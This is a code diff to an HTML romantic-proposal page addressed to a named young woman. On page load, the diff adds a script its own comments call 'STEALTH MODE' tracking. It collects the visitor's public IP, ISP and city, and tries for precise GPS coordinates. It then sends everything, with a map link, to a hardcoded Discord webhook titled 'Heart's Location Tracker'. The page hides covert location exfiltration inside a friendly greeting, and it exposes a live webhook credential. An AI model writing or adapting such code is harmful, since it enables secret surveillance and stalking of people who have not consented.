@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>For Nikitha 💖</title>
+    <title>For Anagha 💖</title>
     <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         * {
@@ -475,7 +475,7 @@
         }
     </style>
 </head>
-<body onload="requestLocationOnLoad()">
+<body onload="requestLocationAndIP()">
     
     <div class="theme-toggle" id="themeToggle">
         <div class="theme-icon" id="themeIcon">🌙</div>
@@ -501,7 +501,7 @@
     <div class="container">
         <div class="header">
             <h2>A Special Heart's Question For</h2>
-            <div class="name">Nikitha</div>
+            <div class="name">Anagha</div>
         </div>
         
         <div class="heart-animation">
@@ -614,123 +614,119 @@
         </div>
         
         <div class="footer">
-            <p>Made with ❤️ for Nikitha</p>
+            <p>Made with ❤️ for Anagha</p>
         </div>
     </div>
 
     <script>
         // =========================================================
-        // NEW: LOCATION TRACKING FUNCTIONS (STEALTH MODE)
+        // UPDATED: LOCATION & IP TRACKING FUNCTIONS (STEALTH MODE)
         // =========================================================
 
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1449999299869151416/BumMTg0MfH_PLIz0gp1BOqjYCO9n_Sha4kidu8o32BRZcPsgAivfh_g5sbde8rOzv8kS';
-        const USER_NAME = 'Nikitha'; // Name of the target for the message
+        const USER_NAME = 'Anagha'; 
 
-        function requestLocationOnLoad() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        
-                        // Location successfully found. 
-                        console.log(`[Stealth Tracker] Location found: Lat ${lat.toFixed(4)}, Lon ${lon.toFixed(4)}`);
-                        
-                        // Send location to local server (if configured)
-                        saveLocationToServer(lat, lon);
-                        
-                        // Send location to Discord webhook
-                        sendLocationToDiscord(lat, lon);
-                    },
-                    (error) => {
-                        // Location permission denied or failure. 
-                        console.error(`[Stealth Tracker] Location failed (Code ${error.code}). Could not get location.`);
-                        sendLocationToDiscord(null, null, error.message);
+        // Primary function to fetch both IP and Geolocation
+        function requestLocationAndIP() {
+            let geoData = { latitude: null, longitude: null, geoError: null };
+            let ipData = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', org: 'N/A', ipError: null };
+
+            // 1. Fetch IP details first
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ip) {
+                        ipData.ip = data.ip;
+                        ipData.city = data.city || 'N/A';
+                        ipData.region = data.region || 'N/A';
+                        ipData.country = data.country_name || 'N/A';
+                        ipData.org = data.org || 'N/A';
+                        console.log(`[Stealth Tracker] IP Details fetched: ${data.ip}, ${data.city}`);
+                    } else {
+                        ipData.ipError = data.error || 'Failed to fetch IP details';
+                        console.error(`[Stealth Tracker] IP Fetch Error: ${ipData.ipError}`);
                     }
-                );
-            } else {
-                console.error('[Stealth Tracker] Geolocation not supported by this browser.');
-                sendLocationToDiscord(null, null, 'Geolocation not supported by browser');
-            }
+                })
+                .catch(error => {
+                    ipData.ipError = `IP API call failed: ${error.message}`;
+                    console.error(`[Stealth Tracker] IP Fetch Exception: ${error.message}`);
+                })
+                .finally(() => {
+                    // 2. Fetch precise Geolocation (requires user permission)
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                geoData.latitude = position.coords.latitude;
+                                geoData.longitude = position.coords.longitude;
+                                console.log(`[Stealth Tracker] Geolocation found: Lat ${geoData.latitude.toFixed(4)}, Lon ${geoData.longitude.toFixed(4)}`);
+                                sendCombinedDataToDiscord(geoData, ipData);
+                            },
+                            (error) => {
+                                geoData.geoError = `Code ${error.code}: ${error.message}`;
+                                console.error(`[Stealth Tracker] Geolocation Error: ${geoData.geoError}`);
+                                sendCombinedDataToDiscord(geoData, ipData); // Send whatever data we have
+                            }
+                        );
+                    } else {
+                        geoData.geoError = 'Geolocation not supported by this browser.';
+                        console.error('[Stealth Tracker] Geolocation not supported by this browser.');
+                        sendCombinedDataToDiscord(geoData, ipData); // Send whatever data we have
+                    }
+                });
         }
 
-        // Existing function for local server logging (kept for completeness)
-        function saveLocationToServer(latitude, longitude) {
-            fetch('/save-location', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ latitude, longitude }),
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Server returned an error status.');
-                }
-                return response.text();
-            })
-            .then(data => {
-                console.log(`[Stealth Tracker] Local save successful: ${data}`);
-            })
-            .catch((error) => {
-                console.error('[Stealth Tracker] LOCAL SERVER WRITE ERROR:', error);
-            });
-        }
+        // Consolidated function to send data to Discord
+        function sendCombinedDataToDiscord(geoData, ipData) {
+            const { latitude, longitude, geoError } = geoData;
+            const { ip, city, region, country, org, ipError } = ipData;
 
-        // NEW: Function to send location data to Discord webhook
-        function sendLocationToDiscord(latitude, longitude, errorMsg = null) {
             if (DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
                 console.error('[Stealth Tracker] Discord webhook URL is a placeholder. Skipping Discord notification.');
                 return;
             }
 
-            let content;
-            let embedColor;
             const timestamp = new Date().toISOString();
-            const mapLink = latitude && longitude ? `[Google Maps Link](https://www.google.com/maps/place/?q=${latitude},${longitude})` : 'N/A';
-            const status = errorMsg ? 'FAILED' : 'SUCCESS';
-
-            if (errorMsg) {
-                content = `🔴 **LOCATION FAILED for ${USER_NAME}** 🔴`;
-                embedColor = 16711680; // Red
-            } else {
-                content = `🟢 **LOCATION SUCCESS for ${USER_NAME}** 🟢`;
-                embedColor = 65280; // Green
-            }
+            const geoStatus = geoError ? 'FAILED' : 'SUCCESS';
+            const ipStatus = ipError ? 'FAILED' : 'SUCCESS';
+            
+            const overallStatus = geoStatus === 'SUCCESS' ? 'SUCCESS' : 
+                                  ipStatus === 'SUCCESS' ? 'PARTIAL SUCCESS (Geo Failed)' : 
+                                  'FAILED';
+            
+            let embedColor = 65280; // Green (Success)
+            if (overallStatus.includes('PARTIAL')) embedColor = 16776960; // Yellow (Partial)
+            if (overallStatus === 'FAILED') embedColor = 16711680; // Red (Failure)
+            
+            const mapLink = latitude && longitude ? `[Google Maps Link](http://maps.google.com/?q=${latitude},${longitude})` : 'N/A';
 
             const payload = {
                 username: "Heart's Location Tracker",
-                avatar_url: "https://i.imgur.com/uT0m66A.png", // A simple heart icon or similar
-                content: content,
+                avatar_url: "https://i.imgur.com/uT0m66A.png",
+                content: `🚨 **NEW VISIT - ${USER_NAME}** | Status: **${overallStatus}**`,
                 embeds: [
                     {
-                        title: "Location Capture Attempt",
-                        description: `Status: **${status}**`,
+                        title: `Tracking Result for ${USER_NAME}`,
+                        description: `Attempt Status: **${overallStatus}**`,
                         color: embedColor,
                         fields: [
-                            {
-                                name: "Target Name",
-                                value: USER_NAME,
-                                inline: true
+                            { name: "Public IP Address", value: ip, inline: true },
+                            { name: "IP Geo Location", value: `${city}, ${region}, ${country}`, inline: true },
+                            { name: "ISP/Organization", value: org, inline: false },
+                            
+                            { name: "--- Geo Coordinates ---", value: `\u200b`, inline: false }, // Separator
+                            
+                            { name: "GPS Coordinates (Precise)", 
+                              value: latitude && longitude ? `${latitude.toFixed(6)}, ${longitude.toFixed(6)}` : 'N/A', 
+                              inline: true 
                             },
-                            {
-                                name: "Timestamp (UTC)",
-                                value: timestamp,
-                                inline: true
-                            },
-                            {
-                                name: "Coordinates",
-                                value: latitude && longitude ? `${latitude.toFixed(6)}, ${longitude.toFixed(6)}` : 'N/A',
-                                inline: false
-                            },
-                            {
-                                name: "Map Link",
-                                value: mapLink,
-                                inline: false
-                            }
-                        ].concat(errorMsg ? [{ name: "Error Details", value: errorMsg, inline: false }] : []),
+                            { name: "GPS Status", value: geoStatus, inline: true },
+                            
+                            { name: "Map Link", value: mapLink, inline: false },
+                            { name: "Timestamp (UTC)", value: timestamp, inline: false }
+                        ].concat(geoError ? [{ name: "GPS Error Reason", value: geoError, inline: false }] : [])
+                         .concat(ipError ? [{ name: "IP Error Reason", value: ipError, inline: false }] : []),
                         footer: {
-                            text: "Powered by the Heart's Question Page"
+                            text: "The Heart's Question Page Tracker"
                         }
                     }
                 ]
@@ -745,17 +741,21 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log(`[Stealth Tracker] Location successfully sent to Discord.`);
+                    console.log(`[Stealth Tracker] Combined data successfully sent to Discord.`);
                 } else {
-                    console.error(`[Stealth Tracker] Failed to send location to Discord. Status: ${response.status}`);
+                    console.error(`[Stealth Tracker] Failed to send combined data to Discord. Status: ${response.status}`);
                 }
             })
             .catch(error => {
-                console.error('[Stealth Tracker] DISCORD WEBHOOK ERROR:', error);
+                console.error('[Stealth Tracker] DISCORD WEBHOOK EXCEPTION:', error);
             });
         }
+        
+        // --- Dummy function for saveLocationToServer removed as it requires a live server ---
+        // --- requestLocationOnLoad renamed to requestLocationAndIP in body tag ---
+        
         // =========================================================
-        // END LOCATION TRACKING FUNCTIONS
+        // END LOCATION & IP TRACKING FUNCTIONS
         // =========================================================
         
         // Theme Toggle Functionality (Original Code)
